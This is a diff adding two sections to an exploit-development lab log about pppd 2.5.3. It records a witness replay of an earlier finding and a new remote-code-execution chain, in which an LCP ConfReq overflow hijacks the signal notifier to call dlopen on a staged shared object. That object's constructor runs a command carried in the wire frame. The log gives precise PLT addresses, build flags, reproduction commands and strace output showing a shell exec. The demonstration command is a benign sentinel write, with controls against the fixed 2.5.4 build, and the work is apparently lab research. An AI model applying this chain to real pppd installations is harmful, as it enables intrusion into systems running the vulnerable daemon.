@@ -224,6 +224,84 @@ effect in a live process. `unlink` is a libc call, not a command, so this is
 (`device_script`, `run_program`) require a fork/child path or a stack frame
 this write primitive cannot provide.
 
+## Witness replay of W132 (DM #1875)
+
+The witness rebuilt both pins from a clean `git archive 740b6fd` with its own
+gcc (`autogen.sh`, `./configure CC=gcc CFLAGS="-g -O0 -fno-pie"
+LDFLAGS=-no-pie`, `make -C pppd`) and confirmed `unlink@plt` at `0x40c4a0` and
+`sigreceived` at `0x468180`. Two straced attacks removed the chosen victim and
+showed `unlink("/tmp/pppd2shell-r5-<marker>-victim") = 0`, then a later
+shutdown SIGSEGV; normalized replays were byte-identical
+(`7552005d67d604aef49b449a5acb121be022454019e3d68cd84afcee9619d092`).
+Safe, NULL-callback and fixed-pin controls left the sentinel intact. Hash
+differences from the canonical capture were only the witness's one-byte
+longer marker. Verdict: **W132 ESTABLISHED at rung 4, not rung 5**.
+
+## W133 — dlopen constructor runs a wire-carried command (2026-11-23)
+
+The W132 conclusion that the pin's exec sites cannot be reached is superseded
+for this build. `nm -D` on the pinned `-no-pie` 2.5.3 pppd shows an
+`dlopen@GLIBC_2.34` import with PLT stub `0x40cd70` (objdump `.plt.sec`;
+`unlink@plt` is `0x40c4a0`). `notify(sigreceived, sig)` passes the signal
+number as `rsi`, the flags argument of `dlopen(path, flags)`: `SIGTERM` is 15
+(includes `RTLD_NOLOAD`, which will not load a new object), while `SIGINT` is
+2 (`RTLD_NOW`). The fake notifier therefore uses `func = dlopen@plt` and
+`arg = <path of a lab-built shared object>`; the SIGINT still arrives through
+`term()` (`main.c:1593-1600`) with no `the_channel` dereference first.
+
+The staged object (`live/call/payload.c`, built with `-DWIRE_CMD
+-DCMD_ADDR=0x468888UL`) has a constructor that reads a C string at the fixed
+address `0x468888` — `inpacket_buf + 8 + 96`, inside the rejected ConfReq body
+— and calls `system()` on it. The command bytes are therefore carried by the
+second wire frame, not baked into the object:
+
+```
+echo PPPD2SHELL_W133_WIRE_COMMAND_RAN > /tmp/pppd2shell-r5-<marker>-victim
+```
+
+Material precondition, stated rather than hidden: a small lab-built `.so`
+must already exist at a known path on the target filesystem. The pin is
+non-PIE (`-no-pie`, global addresses fixed); library and stack ASLR were left
+on. No external system was contacted; the PTY is local.
+
+Reproduce with the vulnerable `-no-pie` pin:
+
+```
+gcc -shared -fPIC -O0 -g -DWIRE_CMD -DCMD_ADDR=0x468888UL \
+  -o /tmp/pppd2shell-r5-<marker>-payload.so \
+  lab/frontier/pppd2shell/live/call/payload.c
+python3 lab/frontier/pppd2shell/live/rce_call.py \
+  --binary "$PWD/lab/frontier/pppd2shell/live/raw/build-vuln-nopie/pppd/pppd" \
+  --marker <marker> --mode attack --callback 0x40cd70 --signal INT \
+  --expect created --arg-path /tmp/pppd2shell-r5-<marker>-payload.so \
+  --wire-cmd 'echo PPPD2SHELL_W133_WIRE_COMMAND_RAN > /tmp/pppd2shell-r5-<marker>-victim' \
+  --strace --trace-exec
+python3 lab/frontier/pppd2shell/live/call/normalize_dlopen.py
+```
+
+Live result on the target PID: `--- SIGINT ---`, then
+`openat(..., "/tmp/pppd2shell-r5-w133d-payload.so", O_RDONLY|O_CLOEXEC) = 12`,
+then `execve("/bin/sh", ["sh", "-c", "--", "echo PPPD2SHELL_W133_WIRE_COMMAN"…
+]) = 0`, then `openat(..., "/tmp/pppd2shell-r5-w133d-victim",
+O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3`. The sentinel file contains exactly
+`PPPD2SHELL_W133_WIRE_COMMAND_RAN\n`. pppd faults later in shutdown
+(`rc -11`) on the corrupted `the_channel`, after the command has run.
+
+| case | result |
+| --- | --- |
+| vulnerable pin, `dlopen@plt`, overflow frame, SIGINT | `/bin/sh` exec, sentinel created with the wire bytes; two straced replays byte-identical after normalization (`6a8ed407…`) |
+| vulnerable pin, short safe ConfReq | no `.so` open, no exec, no sentinel, daemon alive |
+| vulnerable pin, `func = NULL` | SIGSEGV at `notify()`, no sentinel |
+| fixed 2.5.4 pin, identical frames | `LCP: ignoring duplicate configuration option(s)`, no `.so` open, no sentinel, daemon alive |
+
+Grade: attacker wire input makes a live, plant-started pppd execute a
+lab-chosen benign command with an observed side effect, with vulnerable,
+fixed and safe-input controls. The command bytes come from the wire frame.
+This is a **rung 5 candidate, not yet ESTABLISHED**: independent witness
+replay is owed, and the staged `.so` precondition must be carried with any
+claim. Raw logs and frames stay in the gitignored `live/raw/`; normalized
+evidence and hashes are in `live/call/evidence/HASHES_DLOPEN.txt`.
+
 ## Files
 
 `lab/frontier/pppd2shell/live/` holds the driver, normalizer, matrix runner,
